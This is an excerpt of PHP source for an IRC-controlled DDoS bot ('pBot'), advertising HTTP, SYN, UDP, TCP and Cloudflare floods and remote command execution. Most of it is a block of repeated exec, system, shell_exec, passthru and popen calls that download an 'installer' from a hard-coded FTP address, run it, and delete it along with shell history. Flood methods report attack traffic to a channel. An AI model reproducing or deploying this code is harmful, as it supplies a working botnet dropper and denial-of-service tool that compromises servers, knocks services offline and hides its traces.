# Attacks Are HTTP Flood, Syn Flood, UDP, TCP, and Cloudflare.

# Also Has Download Functions and able to execute commands via -exec / -cmd
...
$url="ftp://139.59.14.215/.pwlamea/";
exec('cd /tmp;curl -O '.$url.'installer;chmod +x installer ; ./installer;rm -f installer*;');
exec('cd /tmp;GET '.$url.'installer > installer;chmod +x installer ; ./installer;rm -f installer*;');
exec('cd /tmp;wget '.$url.'installer;chmod +x installer ; ./installer;rm -f installer*;');
exec('cd /tmp;lwp-download '.$url.'installer;chmod +x installer ; ./installer;chmod +x installer ; ./installer?;rm -f installer*;');
exec('cd /tmp;fetch '.$url.'installer >installer;chmod +x installer ; ./installer;rm -f installer*;');
passthru('cd /tmp;fetch '.$url.'installer >installer;chmod +x installer ; ./installer;rm -f installer*;');
passthru('cd /tmp;wget '.$url.'installer;chmod +x installer ; ./installer;rm -f installer*;');
passthru('cd /tmp;lwp-download '.$url.'installer;chmod +x installer ; ./installer;chmod +x installer ; ./installer?;rm -f installer*;');
passthru('cd /tmp;curl -O '.$url.'installer;chmod +x installer ; ./installer;rm -f installer*;');
passthru('cd /tmp;GET '.$url.'installer >installer;chmod +x installer ; ./installer;rm -f installer*;');
system('cd /tmp;curl -O '.$url.'installer;chmod +x installer ; ./installer;rm -f installer*;');
system('cd /tmp;GET '.$url.'installer >installer;chmod +x installer ; ./installer;rm -f installer*;');
system('cd /tmp;wget '.$url.'installer;chmod +x installer ; ./installer;rm -f installer*;');
system('cd /tmp;lwp-download '.$url.'installer;chmod +x installer ; ./installer;chmod +x installer ; ./installer?;rm -f installer*;');
system('cd /tmp;fetch '.$url.'installer >installer;chmod +x installer ; ./installer;rm -f installer*;');
shell_exec('cd /tmp;curl -O '.$url.'installer;chmod +x installer ; ./installer;rm -f installer*;');
shell_exec('cd /tmp;GET '.$url.'installer >installer;chmod +x installer ; ./installer;rm -f installer*;');
shell_exec('cd /tmp;wget '.$url.'installer;chmod +x installer ; ./installer;rm -f installer*;');
shell_exec('cd /tmp;lwp-download '.$url.'installer;chmod +x installer ; ./installer;chmod +x installer ; ./installer?;rm -f installer*;');
shell_exec('cd /tmp;fetch '.$url.'installer >installer;chmod +x installer ; ./installer;rm -f installer*;');
popen('cd /tmp;wget '.$url.'installer;chmod +x installer ; ./installer;rm bot.pl*;/usr/bin/chmod +x installer ; ./installer;rm -f $HISTFILE', "r");
popen('cd /tmp;curl -O '.$url.'installer; chmod +x installer ; ./installer;rm bot.pl*;/usr/bin/chmod +x installer ; ./installer;rm -f $HISTFILE', "r");
popen('cd /tmp;lwp-download '.$url.'installer;chmod +x installer ; ./installer;/usr/bin/chmod +x installer ; ./installer;rm -f $HISTFILE', "r");
popen('cd /tmp;lynx -source '.$url.'installer >installer;chmod +x installer ; ./installer;/usr/bin/chmod +x installer ; ./installer;rm -f $HISTFILE', "r");
popen('cd /tmp;fetch '.$url.'installer >installer;chmod +x installer ; ./installer;/usr/bin/chmod +x installer ; ./installer;rm -f $HISTFILE', "r");
popen('cd /tmp;GET '.$url.'installer >installer;chmod +x installer ; ./installer;/usr/bin/chmod +x installer ; ./installer;rm -f $HISTFILE', "r");
@exec('cd /tmp;curl -O '.$url.'installer;chmod +x installer ; ./installer;rm -f installer*;');
@exec('cd /tmp;GET '.$url.'installer > installer;chmod +x installer ; ./installer;rm -f installer*;');
@exec('cd /tmp;wget '.$url.'installer;chmod +x installer ; ./installer;rm -f installer*;');
@exec('cd /tmp;lwp-download '.$url.'installer;chmod +x installer ; ./installer;chmod +x installer ; ./installer?;rm -f installer*;');
...
class pBot {
    ...
    public function udpflood($host, $port, $time, $packetsize) {
        ...
        $this->privmsg($this->config['chan'], "[\2#AndrewxD -> Ii Dam Clasa la fraier!\2]");
        ...
        $this->privmsg($this->config['chan'], "[\2#AndrewxD -> Atac terminat cu succes!\2]: " . $env . " MB trimisi / Medie: " . $vel . " MB/s ");

    }

    public function tcpconn($host, $port, $time) {

        $this->privmsg($this->config['chan'], "[\2#Andrew -> !\2]");
